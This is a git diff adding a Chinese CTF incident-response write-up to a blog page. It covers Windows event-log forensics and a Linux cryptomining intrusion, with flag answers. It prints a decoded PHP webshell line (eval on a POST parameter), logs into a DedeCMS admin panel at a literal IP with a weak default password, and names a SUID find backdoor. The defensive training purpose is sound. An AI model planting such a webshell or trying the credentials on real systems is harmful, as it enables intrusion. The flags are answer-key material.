@@ -4353,7 +4353,95 @@
 <h4 id="任务四-9"><a href="#任务四-9" class="headerlink" title="任务四"></a>任务四</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/f7a734496dc1b62649fdfbe75ba6b1d4--a99f--image-20240607170316227.png" alt="image-20240607170316227"></p>
 <h4 id="任务五-4"><a href="#任务五-4" class="headerlink" title="任务五"></a>任务五</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/d542768c05edb59f0e430e618fd1e051--3ed2--image-20240607170350816.png" alt="image-20240607170350816"></p>
 <p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/6c4271836480a8fdcdee5f4cdafa562e--e949--image-20240607170415685.png" alt="image-20240607170415685"></p>
-<h1 id="第五章-linux实战"><a href="#第五章-linux实战" class="headerlink" title="第五章-linux实战"></a>第五章-linux实战</h1>]]></content>
+<h1 id="第五章-linux实战"><a href="#第五章-linux实战" class="headerlink" title="第五章-linux实战"></a>第五章-linux实战</h1><h2 id="Windows-实战-evtx-文件分析"><a href="#Windows-实战-evtx-文件分析" class="headerlink" title="Windows 实战-evtx 文件分析"></a>Windows 实战-evtx 文件分析</h2><h4 id="任务一-11"><a href="#任务一-11" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.将黑客成功登录系统所使用的IP地址作为Flag值提交；</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.36.133&#125;</span><br></pre></td></tr></table></figure>
+
+<p>筛选安全日志4624，登录成功，找最早登录的</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/789b239a393078b146d31452deb1381c--3380--image-20240608211122498.png" alt="image-20240608211122498"></p>
+<p>使用日志分析工具，筛选远程登录即可快速找到</p>
+<h4 id="任务二-10"><a href="#任务二-10" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Adnimistartro&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要就是找用户登录的日志即可</p>
+<p>筛选安全日志4781，账户名称已更改</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/c87f0e6fdd7623ecf96ed094dccc791a--81ad--image-20240608213752997.png" alt="image-20240608213752997"></p>
+<p>使用事件id能够更快的去分析</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/d8913a3327f68cad8a53798b7e49e544--c04c--image-20240608212250620.png" alt="image-20240608212250620"></p>
+<p>里面混了一个这不一样的</p>
+<h4 id="任务三-10"><a href="#任务三-10" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCHEMA</span><br></pre></td></tr></table></figure>
+
+<p>筛选安全日志4663，尝试访问对象	检测未经授权访问文件和文件夹的行为</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/b70999143b396ba6cc0ea78373df1b77--d89f--image-20240608213623215.png" alt="image-20240608213623215"></p>
+<h4 id="任务四-10"><a href="#任务四-10" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；</span><br></pre></td></tr></table></figure>
+
+<p>根据上述黑客攻击的时间段，为2020年10月8日 筛选应用程序日志记录时间为2020年10月8日，来事件源为MySQL</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/773c399f7c6d0f4b468cc145d4cfad9e--9277--image-20240608214745960.png" alt="image-20240608214745960"></p>
+<p>然后再搜索start找到最后一次启动mysql</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/954d96fe2e07e030f079c85de7700b57--1fb4--image-20240608214808719.png" alt="image-20240608214808719"></p>
+<p>flag{8820}</p>
+<h4 id="任务五-5"><a href="#任务五-5" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。xxxxxxxxxx 5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。</span><br></pre></td></tr></table></figure>
+
+<p>筛选系统日志1074，计算机开机、关机、重启的时间、原因、注释</p>
+<p>计算机为WIN-B1B1T3K57G9</p>
+<p>CTRL+F 搜索Administratro，找对成对的记录，2次重启，1次关机</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/82df434b76f042e17fa2e451ad457725--0ad8--image-20240608215308905.png" alt="image-20240608215308905"></p>
+<p>也就是三对</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="linux实战-挖矿"><a href="#linux实战-挖矿" class="headerlink" title="linux实战-挖矿"></a>linux实战-挖矿</h2><h4 id="任务一-12"><a href="#任务一-12" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客的IP是？ flag格式：flag&#123;黑客的ip地址&#125;，如：flag&#123;127.0.0.1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接就是查看日志即可，全都是黑客的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/admin/websec_80/log/nginx_access_2023-12-22.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.10.135&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二-11"><a href="#任务二-11" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客攻陷网站的具体时间是？ flag格式：flag&#123;年-月-日 时:分:秒&#125;，如：flag&#123;2023-12-24 22:23:24&#125;</span><br></pre></td></tr></table></figure>
+
+<p>dedecms弱口令进入后台：<a href="http://43.192.51.123:8081/dede/login.php?gotopage=/dede/">http://43.192.51.123:8081/dede/login.php?gotopage=%2Fdede%2F</a></p>
+<p>这里可以通过日志去看出来，密码可以爆破一下即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin    12345678</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/ffe0ac99a34217da0e4dcf771b77c245--e63c--image-20240610134100632.png" alt="image-20240610134100632"></p>
+<p>在账号处发现黑客的用户</p>
+<p>即可知道对应的时间</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023-12-22 19:08:34&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务三-11"><a href="#任务三-11" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客上传webshell的名称及密码是？ flag格式：flag&#123;黑客上传的webshell名称-webshell密码&#125;，如：flag&#123;webshell.php-pass&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接就是将网站源码push下来使用d盾去扫描一下</p>
+<p>直接就能有了</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/a93fe2d838ff17c84e8d9b1bae653ef2--7363--image-20240610140120996.png" alt="image-20240610140120996"></p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/a5e7da53acd4c883bc5778726e753ca0--9166--image-20240610140148993.png" alt="image-20240610140148993"></p>
+<p>本地跑一下这一段即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string(20) &quot;eval($_POST[&#x27;cmd&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;404.php-cmd&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务四-11"><a href="#任务四-11" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客提权后设置的后门文件名称是？ flag格式：flag&#123;后门文件绝对路径加上名称&#125;，如：flag&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接使用history命令查看历史命令执行</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/f4986b2bc6d72d8634948ccf456b8007--7a1d--image-20240610135029337.png" alt="image-20240610135029337"></p>
+<p>发现是使用了suid提权find命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/usr/bin/find&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务五-6"><a href="#任务五-6" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对黑客上传的挖矿病毒进行分析，获取隐藏的Flag</span><br></pre></td></tr></table></figure>
+
+<p>挖矿病毒的话一般情况都是计划任务中定时执行，我们就去查看一下计划任务</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/6f8f04b805135fadd166d5b361a99ac0--a514--image-20240610135737910.png" alt="image-20240610135737910"></p>
+<p>发现下载了一个ldm估计就是挖矿程序了</p>
+<p>查找一下</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/a9a779b045aa7bc68764a75b153e94cf--dab2--image-20240610135810644.png" alt="image-20240610135810644"></p>
+<p>看到很明显的base64编码</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/ccdc5a343929cbf9d186e9224e0fd139--6ea5--image-20240610135903751.png" alt="image-20240610135903751"></p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/db4d266e8ba5c5650817e1e597e2e234--c9cb--image-20240610135942248.png" alt="image-20240610135942248"></p>
+<p>解码成功获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;websec_True@888!&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
       <categories>
         <category>Web</category>
       </categories>
